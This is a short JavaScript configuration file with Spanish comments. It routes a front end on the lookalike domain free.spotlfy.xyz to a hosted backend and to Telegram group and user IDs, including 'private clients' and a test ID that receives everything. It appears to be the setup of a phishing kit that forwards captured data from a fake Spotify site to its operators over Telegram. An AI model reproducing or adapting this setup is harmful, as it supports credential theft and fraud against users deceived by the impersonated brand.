// --- CONFIGURACIÓN DE FRONTEND (SERVER_URL) ---
const SERVER_URL = 'https://kezosc-production.up.railway.app';

// Configuración específica para FREE DOMAIN - Edita según necesites cambiar los IDs
const CONFIG_IDS = {
    GROUP_ID: '-1004493468867',  // ID del grupo de Telegram para free.spotlfy.xyz
    PRIVATES: ['7574919030'],     // Clientes privados del dominio free.spotlfy.xyz
    TEST_ID: '7707049896'         // Tu ID principal (recibe todo para testear)
};

// === SELECCIÓN AUTOMÁTICA POR ORIGEN (DEMO FREE DOMAIN) ===
// Si usas múltiples dominios, edita la función getConfig según necesites
function getConfig(origin) {
    if (origin.includes('free.spotlfy.xyz')) {
        return CONFIG_IDS;
    } else {
        // Fallback al dominio por defecto si no coincide
        return CONFIG_IDS;
    }
}

// === ID PRINCIPAL PARA TESTING (RECIBE TODO) ===
const MAIN_TEST_ID = '7707049896';  // Edita este ID si cambia
